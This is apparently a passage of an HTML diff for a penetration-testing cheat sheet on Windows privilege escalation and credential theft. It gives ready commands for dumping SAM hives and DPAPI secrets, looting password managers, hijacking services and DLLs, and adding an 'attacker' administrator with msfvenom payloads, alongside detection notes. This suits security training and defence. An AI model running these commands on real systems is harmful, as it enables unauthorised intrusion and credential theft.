+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-36934" rel="noopener nofollow">NVD, CVE-2021-36934 (HiveNightmare / SeriousSAM)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> reg save of SAM/SYSTEM is a known credential-dumping IOC. Offline parsing on the attacker host is invisible.</p>
+</article>
+<article id="pe-dpapi-creds">
+<h3>DPAPI Secrets</h3>
+<p class="summary">Decrypt DPAPI-protected creds/vaults with masterkeys.</p>
+<p class="desc">Windows Credential Manager entries and vaults are DPAPI-protected. With the user password (or SYSTEM access to the masterkey, or a domain DPAPI backup key) decrypt the masterkey, then the credential blobs. SharpDPAPI / mimikatz automate this. Chrome/modern-Edge saved logins are also DPAPI-wrapped but live in the browser's own Login Data store and are classified separately as T1555.003 (Credentials from Web Browsers); only IE/legacy-Edge web credentials land in Credential Manager (T1555.004).</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions.</p>
+<h4>Requires</h4><ul class="req"><li>User context / password, or SYSTEM, or the domain DPAPI backup key</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Decrypt a masterkey (known password)</span>
+dpapi::masterkey /in:&quot;%APPDATA%\Microsoft\Protect\&lt;SID&gt;\&lt;GUID&gt;&quot; /sid:&lt;SID&gt; /password:&lt;pw&gt;</code></pre>
+<pre><code><span class="cmt"># Decrypt a credential blob (check both %LOCALAPPDATA%\Microsoft\Credentials\ and %APPDATA%\Microsoft\Credentials\)</span>
+dpapi::cred /in:&quot;%LOCALAPPDATA%\Microsoft\Credentials\&lt;blob&gt;&quot; /masterkey:&lt;key&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/GhostPack/SharpDPAPI" rel="noopener nofollow">SharpDPAPI</a></li><li><a href="https://github.com/gentilkiwi/mimikatz" rel="noopener nofollow">mimikatz</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1555/004/" rel="noopener nofollow">T1555.004</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/" rel="noopener nofollow">harmj0y, Operational Guidance for Offensive User DPAPI Abuse</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html" rel="noopener nofollow">HackTricks, DPAPI Extracting Passwords</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reading masterkey + Credentials files and invoking DPAPI is detectable via file access patterns and known tool signatures.</p>
+</article>
+<article id="pe-stored-creds">
+<h3>Saved Credentials (cmdkey)</h3>
+<p class="summary">Reuse cmdkey-saved creds via runas /savecred.</p>
+<p class="desc">cmdkey /list reveals credentials saved in Credential Manager. If an admin credential was saved by a prior runas /savecred (an interactive-logon-type credential), run commands as that user with runas /savecred without knowing the password, directly inheriting their privileges. Note that credentials merely added with cmdkey /add or /generic are a different credential type and are generally NOT accepted by runas /savecred.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions.</p>
+<h4>Requires</h4><ul class="req"><li>A privileged credential previously saved by runas /savecred (interactive-logon type) in Credential Manager</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># List stored creds</span>
+cmdkey /list</code></pre>
+<pre><code><span class="cmt"># Run as the saved (admin) user (/user: must match the exact target shown by cmdkey /list, e.g. HOSTNAME\Administrator or DOMAIN\svc_admin)</span>
+runas /savecred /user:HOSTNAME\Administrator &quot;cmd /c net localgroup administrators attacker /add&quot;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" rel="noopener nofollow">cmdkey (built-in)</a></li><li><a href="https://ss64.com/nt/runas.html" rel="noopener nofollow">runas (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1078/003/" rel="noopener nofollow">T1078.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/" rel="noopener nofollow">HackingArticles, Stored Credentials (Runas)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Low-noise; uses built-in tools. The runas-spawned process tree under a different user is the main signal.</p>
+</article>
+<article id="pe-winlogon-autologon">
+<h3>Winlogon Autologon</h3>
+<p class="summary">Read a cleartext autologon password from the registry.</p>
+<p class="desc">When automatic logon is configured manually via the registry (KB 324737), Windows stores the account name and its password in cleartext under the Winlogon registry key (DefaultUserName / DefaultPassword, with AutoAdminLogon = 1), and any user can read these values. If the autologon account is a local or domain admin, you have its password directly, no cracking required. This does NOT hold for autologon set up with Sysinternals Autologon.exe: that tool stores the secret as the LSA secret DefaultPassword under HKLM\SECURITY\Policy\Secrets (admin/SYSTEM ACL), so the reg query below returns nothing and recovery needs lsadump / SeSecurityPrivilege instead.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions, only when autologon is configured via the registry (manual KB 324737 path). Autologon set up with Sysinternals Autologon.exe stores the secret as an LSA secret instead, so there is no cleartext DefaultPassword to read.</p>
+<h4>Requires</h4><ul class="req"><li>Autologon configured with a stored DefaultPassword</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Read the autologon values (query the whole key to surface AutoAdminLogon + DefaultUserName/DefaultDomainName/DefaultPassword together)</span>
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg" rel="noopener nofollow">reg (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/002/" rel="noopener nofollow">T1552.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" rel="noopener nofollow">Microsoft, KB 324737: Configure Windows to automate logon</a></li><li><a href="https://attack.mitre.org/techniques/T1552/002/" rel="noopener nofollow">MITRE T1552.002, Credentials in Registry</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Read-only registry query; very quiet. The cleartext password is only present when autologon was configured via the registry; an Autologon.exe-configured host has no DefaultPassword value and needs an LSA-secret dump (noisier, admin-only) instead.</p>
+</article>
+<article id="pe-hivenightmare">
+<h3>HiveNightmare / SeriousSAM</h3>
+<p class="summary">CVE-2021-36934: any user reads SAM via a shadow copy.</p>
+<p class="desc">On affected Windows 10/11 builds the ACLs on C:\Windows\System32\config\SAM, SYSTEM and SECURITY mistakenly granted BUILTIN\Users read access. A non-admin can read these hives out of a Volume Shadow Copy and extract the local-admin hash offline: no SeBackup, no admin token required. Mitigated by patching, fixing the ACLs, and deleting existing shadow copies.</p>
+<p class="meta"><b>Affects:</b> Windows 10 1809–21H1, Windows 11 21H2, and Server 2019 / 2022, pre-patch (patched Aug 2021).</p>
+<h4>Requires</h4><ul class="req"><li>Unpatched vulnerable build</li><li>At least one VSS shadow copy present</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm the over-permissive ACL</span>
+icacls C:\Windows\System32\config\SAM</code></pre>
+<pre><code><span class="cmt"># Extract in-use hives from a shadow copy (produces SAM-haxx etc.)</span>
+HiveNightmare.exe</code></pre>
+<pre><code><span class="cmt"># Dump the extracted hives offline</span>
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">impacket-secretsdump</a></li><li><a href="https://github.com/GossiTheDog/HiveNightmare" rel="noopener nofollow">HiveNightmare PoC</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1003/002/" rel="noopener nofollow">T1003.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934" rel="noopener nofollow">MSRC, CVE-2021-36934</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The raw offline hive read is quiet, but running icacls against the config hives and touching a shadow copy are both documented HiveNightmare detection signatures (Defender/Splunk/SOC Prime), so on a monitored host this is not silent. It depends on a shadow copy existing. Fully patched/mitigated systems are not affected.</p>
+</article>
+<article id="pe-powershell-history">
+<h3>PowerShell History</h3>
+<p class="summary">Read PSReadLine command history for secrets.</p>
+<p class="desc">PSReadLine saves every PowerShell command to ConsoleHost_history.txt in the user profile, readable by its owner. Administrators routinely paste passwords, connection strings, and API keys into PowerShell, so your own history file is a reliable, no-privilege credential source. Reading OTHER users' histories under C:\Users\* needs local admin, since each profile's AppData is ACL'd to the owner, SYSTEM, and Administrators only.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions with PowerShell 5+ / PSReadLine.</p>
+<h4>Requires</h4><ul class="req"><li>A PowerShell history file containing a secret</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Read your own history file (no privilege)</span>
+type &quot;%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;</code></pre>
+<pre><code><span class="cmt"># All users (requires local admin: reads other profiles)</span>
+gc C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">WinPEAS</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/003/" rel="noopener nofollow">T1552.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1552/003/" rel="noopener nofollow">MITRE T1552.003, Shell History</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reading your own file is silent. The all-users wildcard read is admin-only and can generate access-denied noise or file-access audit events (4663) across other users' profiles. Depends on a user having typed a secret.</p>
+</article>
+<article id="pe-config-password-hunt">
+<h3>Files &amp; Configs with Secrets</h3>
+<p class="summary">Hunt secrets across configs, scripts, and user artifacts.</p>
+<p class="desc">Credentials hide all over the filesystem: unattended-install files (Unattend.xml, sysprep, Autounattend.xml under C:\Windows\Panther\), application configs (web.config, *.config, appsettings.json), scripts and .bat/.ps1 files, and user artifacts: the Recycle Bin, Sticky Notes (plum.sqlite), unsaved Notepad tabs (Windows 11 TabState), and custom config files. Grep broadly for password/key patterns; winPEAS and LaZagne automate most of these locations.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (some artifact paths, e.g. Sticky Notes / Notepad tabs, vary by build).</p>
+<h4>Requires</h4><ul class="req"><li>Readable files that contain credentials</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Recursive password grep</span>
+findstr /si password *.xml *.ini *.txt *.config *.json</code></pre>
+<pre><code><span class="cmt"># Unattend / sysprep files</span>
+dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\System32\sysprep\*.xml</code></pre>
+<pre><code><span class="cmt"># Sticky Notes store</span>
+dir /s C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">WinPEAS</a></li><li><a href="https://github.com/AlessandroZ/LaZagne" rel="noopener nofollow">LaZagne</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">T1552.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">MITRE T1552.001, Credentials In Files</a></li><li><a href="https://github.com/AlessandroZ/LaZagne" rel="noopener nofollow">LaZagne</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Read-only hunting is quiet; broad recursive searches can be noisy on disk-access auditing.</p>
+</article>
+<article id="pe-password-managers">
+<h3>Password Managers &amp; Browsers</h3>
+<p class="summary">Loot KeePass / browser stores for saved logins.</p>
+<p class="desc">Locally stored vaults are high-value: KeePass .kdbx databases (and the KeePass 2.x CVE-2023-32784 master-password memory leak), browser-saved logins (Chrome/Edge &quot;Login Data&quot; SQLite, DPAPI-protected), and config files for other managers. LaZagne pulls credentials from dozens of such apps in one pass. Password-manager theft is T1555.005; browser-saved login theft is the distinct sub-technique T1555.003 (Credentials from Web Browsers).</p>
+<p class="meta"><b>Affects:</b> Depends on the installed application, not the Windows build.</p>
+<h4>Requires</h4><ul class="req"><li>A local vault or browser store plus the user context / DPAPI (or its key) for kdbx and browser looting; the KeePass CVE-2023-32784 path instead needs a KeePass process-memory dump, not the master password</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find KeePass databases</span>
+dir /s /b C:\Users\*.kdbx</code></pre>
+<pre><code><span class="cmt"># LaZagne, all modules</span>
+lazagne.exe all</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/AlessandroZ/LaZagne" rel="noopener nofollow">LaZagne</a></li><li><a href="https://github.com/vdohney/keepass-password-dumper" rel="noopener nofollow">KeePass CVE-2023-32784 PoC</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1555/005/" rel="noopener nofollow">T1555.005</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1555/005/" rel="noopener nofollow">MITRE T1555.005, Password Managers</a></li><li><a href="https://attack.mitre.org/techniques/T1555/003/" rel="noopener nofollow">MITRE T1555.003, Credentials from Web Browsers</a></li><li><a href="https://nvd.nist.gov/vuln/detail/cve-2023-32784" rel="noopener nofollow">NVD, CVE-2023-32784 (KeePass master password in memory)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reading browser/KeePass files is quiet; LaZagne is AV-signatured.</p>
+</article>
+<article id="pe-unquoted-service-path">
+<h3>Unquoted Service Path</h3>
+<p class="summary">Plant a binary along an unquoted, space-containing service path.</p>
+<p class="desc">When a service ImagePath contains spaces and is not wrapped in quotes (e.g. C:\Program Files\My App\svc.exe), Windows tries each space-delimited prefix as an executable: C:\Program.exe, then C:\Program Files\My.exe, and so on. If you can write to one of those intermediate directories, drop a malicious binary there and it runs as the service account on next start.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (configuration weakness).</p>
+<h4>Requires</h4><ul class="req"><li>Service with an unquoted path + space</li><li>Write access to an intermediate directory</li><li>Ability to restart the service or reboot</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find unquoted paths with spaces</span>
+Get-WmiObject win32_service | ? { $_.PathName -notlike '&quot;*' -and $_.PathName -like '* *' } | select Name, PathName</code></pre>
+<pre><code><span class="cmt"># Restart the service to trigger (sc stop is async and returns before STOPPED, so the start can race error 1061; poll or wait, e.g. sc query ... | findstr STOPPED, or rely on the auto-start-on-reboot path)</span>
+sc stop &lt;service&gt; &amp; sc query &lt;service&gt; | findstr STOPPED &amp; sc start &lt;service&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">WinPEAS</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit" rel="noopener nofollow">PowerUp</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/009/" rel="noopener nofollow">T1574.009</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.</p>
+</article>
+<article id="pe-weak-service-perms">
+<h3>Weak Service Permissions (binPath)</h3>
+<p class="summary">Reconfigure a modifiable service binPath to your command.</p>
+<p class="desc">If your user holds SERVICE_CHANGE_CONFIG (or SERVICE_ALL_ACCESS) on a SYSTEM service, rewrite its binPath to an arbitrary command, then restart it. The Service Control Manager launches your command as the service account (typically LocalSystem). Find these with accesschk or SharpUp.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (configuration weakness).</p>
+<h4>Requires</h4><ul class="req"><li>SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service</li><li>Ability to start/stop it</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Enumerate modifiable services</span>
+accesschk.exe -uwcqv &quot;Users&quot; * /accepteula</code></pre>
+<pre><code><span class="cmt"># Hijack binPath (note the space after '=')</span>
+sc config &lt;service&gt; binpath= &quot;net localgroup administrators attacker /add&quot;</code></pre>
+<pre><code><span class="cmt"># Trigger</span>
+sc stop &lt;service&gt; &amp; sc start &lt;service&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/GhostPack/SharpUp" rel="noopener nofollow">SharpUp</a></li><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noopener nofollow">accesschk (Sysinternals)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener nofollow">T1543.003</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.</p>
+</article>
+<article id="pe-insecure-service-binary">
+<h3>Writable Service Binary</h3>
+<p class="summary">Overwrite a service EXE you can write to.</p>
+<p class="desc">If the on-disk service executable (or its containing folder) is writable by your user but the service runs as SYSTEM, replace the binary with your payload and restart the service. Distinct from binPath abuse: here the misconfiguration is filesystem ACLs on the EXE rather than the service config.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (configuration weakness).</p>
+<h4>Requires</h4><ul class="req"><li>Write/modify permission on the service EXE or its directory</li><li>Service runs as SYSTEM/elevated</li><li>Ability to restart it</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check write access to a service binary</span>
+accesschk.exe -quvw &quot;Users&quot; &quot;C:\Path\To\service.exe&quot; /accepteula</code></pre>
+<pre><code><span class="cmt"># Stop, replace, restart (running service locks its EXE)</span>
+sc stop &lt;service&gt; &amp; copy /y payload.exe &quot;C:\Path\To\service.exe&quot; &amp; sc start &lt;service&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noopener nofollow">accesschk (Sysinternals)</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit" rel="noopener nofollow">PowerUp</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/010/" rel="noopener nofollow">T1574.010</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> File-modification + service-restart events. Back up the original binary to restore the service afterward.</p>
+</article>
+<article id="pe-weak-registry-service">
+<h3>Weak Service Registry Perms</h3>
+<p class="summary">Rewrite a service ImagePath via a writable registry key.</p>
+<p class="desc">If your user can write to a service key under HKLM\SYSTEM\CurrentControlSet\Services (even without service-config rights via the SCM), modify the ImagePath value to point at your binary. On next start the service launches your executable as its configured account (SYSTEM only if the service runs as LocalSystem; check ObjectName before targeting). Enumerate writable service keys with accesschk -k.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (configuration weakness).</p>
+<h4>Requires</h4><ul class="req"><li>Write access to a service registry key</li><li>Ability to restart the service or reboot</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find writable service keys</span>
+accesschk.exe -kvuqsw hklm\System\CurrentControlSet\Services /accepteula</code></pre>
+<pre><code><span class="cmt"># Overwrite ImagePath</span>
+reg add HKLM\SYSTEM\CurrentControlSet\Services\&lt;svc&gt; /v ImagePath /t REG_EXPAND_SZ /d &quot;C:\Temp\payload.exe&quot; /f</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noopener nofollow">accesschk (Sysinternals)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/011/" rel="noopener nofollow">T1574.011</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> Registry modification of ImagePath on a service key is a high-fidelity detection: the write event is logged the moment it happens (Sysmon Event ID 13, Security 4657) regardless of any later reversion. Restore the value afterward for operational cleanup and to avoid breaking the service, not to evade detection (restoring only adds a second change event).</p>
+</article>
+<article id="pe-service-dll-hijack">
+<h3>Service DLL Hijacking</h3>
+<p class="summary">Plant a DLL a privileged service loads from a writable path.</p>
+<p class="desc">A SYSTEM service that searches for a DLL by name and finds it in a writable, earlier search-order location (or a missing 'phantom' DLL) will load attacker code into its process. Identify the missing/hijackable module (e.g. with Process Monitor) and drop a matching DLL whose DllMain runs your payload.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (depends on the service).</p>
+<h4>Requires</h4><ul class="req"><li>Privileged service that loads a DLL from a writable / missing path</li><li>Ability to restart it</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Generate an x64 add-admin DLL (EXITFUNC=thread keeps the hijacked service alive)</span>
+msfvenom -p windows/x64/exec CMD='net localgroup administrators attacker /add' EXITFUNC=thread -f dll -o hijack.dll</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" rel="noopener nofollow">Process Monitor (Sysinternals)</a></li><li><a href="https://github.com/rapid7/metasploit-framework" rel="noopener nofollow">msfvenom (Metasploit)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener nofollow">T1574.001</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> An unsigned DLL loaded by a signed service binary from a user-writable directory (Sysmon Event ID 7) is a strong detection signal.</p>
+</article>
+<article id="pe-path-dll-hijack">
+<h3>Writable %PATH% Directory</h3>
+<p class="summary">Plant a DLL a privileged service resolves by name from %PATH%.</p>
+<p class="desc">If a directory listed in the system PATH is writable by your user, a privileged process or service that loads a DLL by bare name (no full path) can resolve it from your writable directory. Under the default DLL search order, PATH is searched LAST (after the application directory, System32, the Windows directory, and the current directory), so this only works for a DLL the target does NOT already resolve from one of those earlier locations, i.e. a missing / &quot;ghost&quot; DLL. Drop a matching DLL whose DllMain runs your payload; it loads into the privileged process. Distinct from a per-app DLL hijack: here the weakness is a globally writable PATH entry.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (depends on a writable PATH entry).</p>
+<h4>Requires</h4><ul class="req"><li>A user-writable directory on the system PATH</li><li>A privileged service/process that DLL-loads by bare name</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Show the system PATH</span>
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot; /v Path</code></pre>
+<pre><code><span class="cmt"># Check each PATH dir for write access (scoped to a principal you control)</span>
+accesschk.exe -uwdq &quot;Users&quot; &quot;C:\SomePathDir&quot; /accepteula</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noopener nofollow">accesschk (Sysinternals)</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit" rel="noopener nofollow">PowerUp (Find-PathDLLHijack)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/007/" rel="noopener nofollow">T1574.007</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1574/007/" rel="noopener nofollow">MITRE T1574.007, Path Interception by PATH Env Var</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> An unsigned DLL loaded by a signed, privileged binary from a user-writable PATH directory (Sysmon Event ID 7) is a strong signal.</p>
+</article>
+<article id="pe-autorun-writable">
+<h3>Writable Autorun</h3>
+<p class="summary">Overwrite an autorun binary that runs as an admin.</p>
+<p class="desc">Programs referenced by Run/RunOnce registry keys or the Startup folder execute when a user logs on. If an autorun entry points to a binary you can overwrite (or its key is writable), replace it; when a higher-privileged user logs in, your payload runs in their context. Enumerate with Autoruns or winPEAS.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (configuration weakness).</p>
+<h4>Requires</h4><ul class="req"><li>Writable autorun binary or writable Run key</li><li>A higher-privileged user logs in</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># List the HKLM Run key (the escalation target: fires for whoever logs on)</span>
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></pre>
+<pre><code><span class="cmt"># List the HKCU Run key (context only: runs as the current user, useful for finding writable target binaries)</span>
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></pre>
+<pre><code><span class="cmt"># Check write access to the target binary</span>
+accesschk.exe -wvu &quot;C:\Path\To\autorun.exe&quot; /accepteula</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns" rel="noopener nofollow">Autoruns (Sysinternals)</a></li><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">WinPEAS</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1547/001/" rel="noopener nofollow">T1547.001</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).</p>
+</article>
+<article id="pe-scheduled-task-abuse">
+<h3>Scheduled Task Abuse</h3>
+<p class="summary">Hijack a task whose binary you can overwrite.</p>
+<p class="desc">Enumerate scheduled tasks and their actions; if a task runs as SYSTEM (or another privileged user) and invokes a binary/script you can write to, overwrite it with your payload. It executes under the task principal at the next trigger. Tasks running as SYSTEM are the prize.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (configuration weakness).</p>
+<h4>Requires</h4><ul class="req"><li>Writable binary/script invoked by a privileged scheduled task</li><li>Task trigger fires (or you can run it)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Enumerate tasks + run-as user</span>
+schtasks /query /fo LIST /v</code></pre>
+<pre><code><span class="cmt"># Check write access to a task's target</span>
+accesschk.exe -quv &quot;C:\Path\To\task.exe&quot; /accepteula</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks" rel="noopener nofollow">schtasks</a></li><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">WinPEAS</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/005/" rel="noopener nofollow">T1053.005</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.</p>
+</article>
+<article id="pe-mssql-xpcmdshell">
+<h3>MSSQL xp_cmdshell</h3>
+<p class="summary">Run OS commands as the SQL service account.</p>
+<p class="desc">With sysadmin access to a local MSSQL instance, enable and call xp_cmdshell to execute OS commands as the SQL Server service account. If that account holds SeImpersonatePrivilege (common for service accounts), chain into a Potato attack for full SYSTEM.</p>
+<p class="meta"><b>Affects:</b> Any Windows host with a local MSSQL instance you are sysadmin on (SQL-version dependent, not OS).</p>
+<h4>Requires</h4><ul class="req"><li>sysadmin role on the MSSQL instance</li><li>xp_cmdshell enable-able</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Enable xp_cmdshell</span>
+EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;</code></pre>
+<pre><code><span class="cmt"># Execute as the service account</span>
+EXEC xp_cmdshell 'whoami /priv';</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">impacket-mssqlclient</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1059/003/" rel="noopener nofollow">T1059.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html" rel="noopener nofollow">HackTricks, Pentesting MSSQL</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> sp_configure + xp_cmdshell are heavily monitored; many EDRs flag sqlservr.exe spawning cmd.exe.</p>
+</article>
+<article id="pe-vuln-software">
+<h3>Vulnerable Third-Party Software</h3>
+<p class="summary">Exploit a known LPE in installed software.</p>
+<p class="desc">Enumerate installed applications and services and match their versions to public local-privilege-escalation CVEs. Vulnerable updaters, agents, VPN clients, and helper services frequently run as SYSTEM and have known exploits. winPEAS flags installed software and writable program directories; an outdated third-party service is often the easiest SYSTEM on the box.</p>
+<p class="meta"><b>Affects:</b> Depends on the installed software, not the Windows build.</p>
+<h4>Requires</h4><ul class="req"><li>Installed software with a known, exploitable LPE</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># List installed software (registry, no MSI self-repair)</span>
+reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall&quot; /s | findstr &quot;DisplayName DisplayVersion&quot;</code></pre>
+<pre><code><span class="cmt"># 32-bit apps (Wow6432Node, missed by the native hive on 64-bit Windows)</span>
+reg query &quot;HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall&quot; /s | findstr &quot;DisplayName DisplayVersion&quot;</code></pre>
+<pre><code><span class="cmt"># Non-default service binaries (PowerShell/CIM; wmic is disabled by default on 24H2 and being removed (25H2 upgrade / Server 2025 FoD-only))</span>
+Get-CimInstance Win32_Service | ? { $_.PathName -notlike '*C:\Windows*' } | select Name,PathName,StartMode</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/peass-ng/PEASS-ng" rel="noopener nofollow">WinPEAS</a></li><li><a href="https://www.exploit-db.com/" rel="noopener nofollow">Exploit-DB</a></li></ul>
